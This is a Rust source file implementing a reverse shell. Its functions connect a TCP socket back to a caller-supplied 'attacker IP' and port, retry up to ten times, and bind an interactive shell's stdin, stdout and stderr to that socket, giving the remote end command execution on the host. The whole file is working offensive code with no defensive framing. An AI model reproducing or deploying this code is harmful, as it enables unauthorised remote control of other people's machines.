extern crate socket2;

use std::error::Error;
use std::{thread, time};
use std::net::{SocketAddr};
use self::socket2::{Socket, Domain, Type};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};


pub fn shell(ip: String, port: String, command: String) -> Result<(), Box<dyn Error>> {
    let target_addr = [ip, port].join(":");
    // Trying to launch reverse shell 10 times with 1 sec delay.
    for i in 0..10 {
        connect(&target_addr, &command)?;
        println!("\t>> Retrying to connect shell: {}", i);
        thread::sleep(time::Duration::from_secs(1));
    }
    Ok(())
}

fn connect(target_addr: &String, command: &String) -> Result<(), Box<dyn Error>>{

    // Create a TCP listener bound to two addresses
    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();

    // Connect back to attacker IP
    match socket.connect(&target_addr.parse::<SocketAddr>()?.into()) {
        Ok(_) => {println!("[*] Connected to host  //{}.", &target_addr);},
        Err(_) => {println!("[!] Failed connecting to host //{}.", &target_addr);}
    };

    let s = socket.into_tcp_stream();

    // Raw FD for unix
    let fd = s.as_raw_fd();

    // Open shell
    Command::new(command)
        // Add an option to pass arguments ?
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
    Ok(())
}
